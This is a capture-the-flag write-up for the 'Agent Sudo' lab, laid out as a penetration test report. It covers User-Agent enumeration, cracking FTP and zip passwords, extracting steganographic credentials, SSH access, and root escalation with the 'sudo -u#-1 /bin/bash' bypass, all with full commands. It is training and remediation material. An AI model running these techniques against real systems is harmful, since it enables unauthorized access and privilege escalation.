# Agent Sudo -- CTF Writeup -- Web Enumeration, Steganography, SSH Access, and Sudo Privilege Escalation

## 1. Engagement Overview
- Title / Project Name: Agent Sudo CTF Writeup
- Author: 0xBlood
- Date: 2025-11-01
- Objective: Compromise the target, obtain user and root flags, and document methodology.
- Scope / Target: IP: 10.201.41.224 | Room: Agent Sudo
- Testing Window: Scan date (local notes): 2025-09-12
- Tools Used: nmap, curl, Hydra, FTP, zip2john, john, steghide, SSH, scp, linPEAS, bash
- Methodology Reference: Reconnaissance → Enumeration → Exploitation → Post-Exploitation → Privilege Escalation → Cleanup

## 2. Short Summary
Initial access was gained via web enumeration with custom User-Agent headers, revealing a hint for weak credentials. Used FTP to retrieve files, extracted hidden zip and steganography data to obtain SSH credentials for james. SSH login provided user-level access and a user flag. Privilege escalation achieved via sudo misconfiguration using the `sudo -u#-1 /bin/bash` technique to spawn a root shell and read `/root/root.txt`.

## 3. Methodology / Process Flow

### 3.1 Reconnaissance
**Command:**

```bash
nmap -sS 10.201.41.224
```

**Key output:**

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

**Notes:** FTP, SSH, and HTTP were open. Anonymous FTP was disabled. Webserver required custom User-Agent headers.

### 3.2 Enumeration
**Web enumeration (port 80):**

Message:

> Dear agents,
>
> Use your own codename as user-agent to access the site.
>
> From,
> Agent R

Using curl to iterate User-Agent values (single letters) revealed a valid agent **C**:

```bash
curl -A "C" -L 10.201.41.224
```

Response indicated **Chris** has a weak password, hinting at FTP/SSH login credentials.

### 3.3 Exploitation
**FTP enumeration:**

Logged in with credentials found via Hydra `(chris:crystal)`:

```bash
ftp 10.201.41.224
# 230 Login successful.
ls
# -rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
# -rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
# -rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

Downloaded and inspected `To_agentJ.txt`:

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Other files (images) contained hidden information.

### 3.4 Post-Exploitation
**Steganography / hidden data extraction**

Extracting hidden zip from `cutie.png`:

```bash
unzip cutie.png
# warning about extra bytes; attempting 7z instead
```

Using `zip2john` and `john` to crack the zip:

```bash
zip2john hidden.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# password found: alien
```

Reading `To_agentR.txt`:

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Base64 decoded `QXJlYTUx` → **Area51** — thought to be used as agent J's password, however is the steganography password.

Extracting steganography from `cute-alien.jpg`:

```bash
steghide info cute-alien.jpg
steghide extract -sf cute-alien.jpg
cat message.txt
# Hi james,
#
# Glad you find this message. Your login password is hackerrules!
```

### 3.5 Persistence / Cleanup
N/A for CTF. Credentials and tools left only temporarily; removed post-exploitation.

## 4. Findings Summary

| ID | Vulnerability | Severity | Impact | Recommendation |
|----|--------------|----------|--------|----------------|
| 1  | Weak credentials via web hint | Medium | Allowed brute-forcing and credential stuffing | Remove operational hints, enforce strong password policy |
| 2  | Insecure FTP credentials | High | Unauthorized access to sensitive files | Disable FTP or enforce SFTP, require strong passwords |
| 3  | Sensitive data hidden in images | Medium | Credentials leakage, lateral movement | Avoid embedding secrets in public artifacts |
| 4  | Sudo misconfiguration | Critical | Full system compromise (root access) | Remove dangerous sudo rules, audit sudoers |

## 5. Technical Details

### Finding <1> — Weak Credentials via Web Hint
- **Description:** Web app disclosed operational hints instructing use of codenames as User-Agent. Iteration identified agent `C`, revealing that user Chris had weak credentials.
- **Impact:** Facilitated brute forcing/credential stuffing, leading to FTP access.
- **Evidence:** `curl -A "C" -L 10.201.41.224` response message.
- **Recommendation:** Remove operational hints from public interfaces; enforce rate limiting and strong password policy.
- **References:** OWASP ASVS, OWASP Testing Guide (credential enumeration).

### Finding <2> — Insecure FTP Credentials
- **Description:** FTP login succeeded with weak credentials `chris:crystal`.
- **Impact:** Unauthorized access to files containing sensitive hints and images with embedded data.
- **Evidence:** `ftp 10.201.41.224` session showing file listings.
- **Recommendation:** Disable FTP or enforce SFTP; require strong passwords; monitor access logs.
- **References:** NIST SP 800-63, CIS Benchmarks.

### Finding <3> — Sensitive Data Hidden in Images (Steganography)
- **Description:** Images contained hidden zip and steganographic messages revealing passwords.
- **Impact:** Leakage of credentials enabling lateral movement to SSH.
- **Evidence:** `zip2john`, `john`, and `steghide` outputs; `message.txt` revealing `hackerrules` for `james`.
- **Recommendation:** Avoid embedding secrets in public artifacts; implement secret management.
- **References:** steghide documentation; general secure development practices.

### Finding <4> — Sudo Misconfiguration Enabling Root Escalation
- **Description:** `sudo -l` showed `(ALL, !root) /bin/bash`. Exploited with `sudo -u#-1 /bin/bash` to obtain root.
- **Impact:** Full system compromise and access to `/root/root.txt`.
- **Evidence:** `sudo -u#-1 /bin/bash` followed by `whoami -> root`.
- **Recommendation:** Remove dangerous sudo rules; restrict shell execution; audit sudoers; apply least privilege.
- **References:** Exploit-DB 47502; PEASS-ng docs.

## 6. Remediation Plan
1. Remove informative banners and hints from web application responses.
2. Disable FTP or migrate to SFTP; enforce strong password policies and MFA.
3. Audit repositories and assets for embedded secrets; use dedicated secret storage.
4. Review `sudoers` for unsafe rules; implement least-privilege and regular audits.
5. Continuous monitoring and alerting for brute-force attempts.

## 7. Appendices
- Tool outputs
- Screenshots
- Scripts / Exploits used
- Command reference
- Evidence hashes

---

### Appendix: Commands Used
```bash
# Recon
nmap -sS 10.201.41.224

# Web enumeration
curl -A "C" -L 10.201.41.224

# FTP
ftp 10.201.41.224
# download To_agentJ.txt, cutie.png, cute-alien.jpg

# Extract zip from png
unzip cutie.png
zip2john hidden.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
cat To_agentR.txt

# Stego
steghide info cute-alien.jpg
steghide extract -sf cute-alien.jpg
cat message.txt

# SSH
ssh james@10.201.41.224
cat user_flag.txt
scp Alien_autospy.jpg /image.jpg

# Privilege escalation
scp linpeas.sh james@10.201.41.224:/tmp/
sudo -u#-1 /bin/bash
cat /root/root.txt
```
